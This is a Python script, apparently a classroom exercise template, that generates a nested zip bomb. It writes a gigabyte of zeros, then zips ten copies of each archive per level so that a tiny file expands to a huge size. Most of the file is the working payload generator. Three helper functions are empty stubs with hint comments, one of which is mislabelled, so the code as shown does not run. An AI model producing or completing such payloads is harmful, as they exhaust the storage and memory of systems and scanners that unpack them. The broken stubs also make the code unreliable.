import zlib
import zipfile
import shutil
import os
import sys
import time

def get_file_size(filename):

	# using the os library, get the filesize and return it in this function

def generate_dummy_file(filename,size):

	with open(filename,'w') as dummy:
		for i in range(1024):
			dummy.write((size*1024*1024)*'0')

def get_filename_without_extension(name):

	# return the user entered name without the extension (hint: you can get the first substring delineated by .)

def get_extension(name):

	# return the user entered name without the extension (hint: you can get the last substring delineated by .)

def compress_file(infile,outfile):

	zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
	zf.write(infile, compress_type=zipfile.ZIP_DEFLATED)
	zf.close()

def make_copies_and_compress(infile, outfile, n_copies):

	zf = zipfile.ZipFile(outfile, mode='w', allowZip64= True)
	for i in range(n_copies):
		f_name = '%s-%d.%s' % (get_filename_without_extension(infile),i,get_extension(infile))
		shutil.copy(infile,f_name)
		zf.write(f_name, compress_type=zipfile.ZIP_DEFLATED)
		os.remove(f_name)
	zf.close()

if __name__ == '__main__':

	# Check to see if the user has entered the correct arguments
	if len(sys.argv) < 3:
		print('Usage:\n')
		print(' zipbomb.py n_levels out_zip_file')
		exit()

	# get the number of levels and file name
	n_levels = int(sys.argv[1])
	out_zip_file = sys.argv[2]

	# create a dummy sparse text file
	dummy_name = 'dummy.txt'

	# begin the timer
	start_time = time.time()

	# create a large dummy text file - size can be altered in function above
	generate_dummy_file(dummy_name,1)

	# compress the file and save it in its own zip archive
	level_1_zip = '1.zip'
	compress_file(dummy_name, level_1_zip)

	# remove the dummy file
	os.remove(dummy_name)
	decompressed_size = 1

	# repeat the process
	for i in range(1,n_levels+1):
		make_copies_and_compress('%d.zip'%i,'%d.zip'%(i+1),10)
		decompressed_size *= 10
		os.remove('%d.zip'%i)
	if os.path.isfile(out_zip_file):
		os.remove(out_zip_file)


	os.rename('%d.zip'%(n_levels+1),out_zip_file)
	end_time = time.time()

	print('Compressed File Size: %.2f KB'%(get_file_size(out_zip_file)/1024.0))
	print('Size After Decompression: %d GB'%decompressed_size)
	print('Generation Time: %.2fs'%(end_time - start_time))